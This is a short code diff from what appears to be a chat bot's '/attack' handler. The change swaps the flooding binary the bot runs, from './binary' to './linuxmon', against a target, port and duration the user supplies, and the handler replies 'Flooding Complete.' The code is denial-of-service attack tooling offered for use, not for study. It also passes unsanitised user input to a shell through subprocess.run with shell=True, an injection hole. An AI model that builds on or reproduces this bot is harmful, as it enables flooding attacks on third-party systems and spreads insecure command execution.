@@ -198,7 +198,7 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                full_command = f"./binary {target} {port} {time} 1600"
+                full_command = f"./linuxmon {target} {port} {time} 1800"
                 subprocess.run(full_command, shell=True)
                 response = f"Flooding Complete."
         else:
